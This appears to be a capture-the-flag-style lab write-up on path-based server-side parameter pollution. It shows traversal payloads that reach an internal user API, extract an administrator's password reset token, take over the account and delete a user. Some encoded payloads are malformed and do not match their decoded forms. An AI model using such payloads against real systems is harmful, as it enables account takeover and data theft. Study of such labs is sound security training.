# 

# Exploiting server-side parameter pollution in a REST URL (Path-based SSPP)

## **Concept**

The application constructs internal REST API paths using user input. Due to improper sanitization and **path normalization**, an attacker can inject traversal sequences (`../`) to manipulate the backend request and access unintended internal API endpoints.

---

## **End Goal**

Access internal API endpoints to retrieve sensitive data (admin fields), escalate privileges, and perform admin actions (e.g., delete user `carlos`).

---

# **Analysis**

---

## **1. Recon and identifying injection point**

- While exploring the application, we observe a request like:

```
GET /edit_profile.php?name=peter
```

- This gets translated internally to:

```
GET /api/private/users/peter
```

 This indicates:

- User input (`name`) is directly embedded into a **REST path**
- Possible attack surface for **path-based injection**

---

## **2. Testing for path traversal**

- We inject traversal sequences:

```
name=peter/../administrator
```

Encoded:

```
name=peter%2f..%administrator
```

- Backend request becomes:

```
/api/private/users/peter/../administrator
```

- After normalization:

```
/api/private/users/administrator
```

 This confirms:

- Path normalization is happening
- Input is not sanitized

---

## **3. Discovering internal API via unexpected response**

- While experimenting further, an unexpected response reveals an **OpenAPI specification**:

```json
{
  "openapi": "3.0.0",
  "paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
      "get": { ... }
    }
  }
}
```

 This is a major information disclosure:

- Internal API endpoint discovered
- Structure of parameters revealed

---

## **4. Understanding the internal API**

From the leaked spec:

```
/api/internal/v1/users/{username}/field/{field}
```

- `username` → target user
- `field` → specific attribute of the user

 This suggests we can extract **individual sensitive fields**

---

## **5. Crafting traversal payload to reach internal API**

We escape from:

```
/api/private/users/
```

To:

```
/api/internal/v1/users/administrator/field/passwordResetToken
```

---

## **Payload**

```
name=peter/../../internal/v1/users/administrator/field/passwordResetToken
```

Encoded: [Not needed here]

```
name=peter%2f..%2f..%2finternal%2fv1%2fusers%administrator%2ffield%passwordResetToken
```

---

## **6. Backend transformation**

Constructed request:

```
/api/private/users/peter/../../internal/v1/users/administrator/field/passwordResetToken%23
```

After normalization:

```
/api/internal/v1/users/administrator/field/passwordResetToken#
```

---

## **7. Extracting sensitive data**

- Response:

```json
{
  
  "field": "passwordResetToken",
  "value": "plmp4rme4nusx4c8dzeigw28autmn0bi"
}
```

 Successfully retrieved admin’s reset token.

---

## **8. Account takeover**

- Use the token:

```
GET /forgot-password?passwordResetToken=plmp4rme4nusx4c8dzeigw28autmn0bi
```

- Reset admin password
- Login as administrator

---

## **9. Privilege abuse**

- Navigate to admin panel
- Delete user `carlos`

---

# **Key Takeaways**

- User input in REST paths is extremely dangerous if unsanitized
- Path normalization (`../`) can be abused to:
    - Escape intended endpoints
    - Access internal APIs
- OpenAPI leaks provide:
    - Endpoint structure
    - Parameter names
    - Attack blueprint

---

# **Vulnerability Chain**

1. User input → inserted into REST path
2. Path traversal (`../`) → escapes endpoint
3. Path normalization → rewrites backend request
4. Internal API exposed → sensitive data access
5. Sensitive data → privilege escalation
6. Admin access → destructive actions

---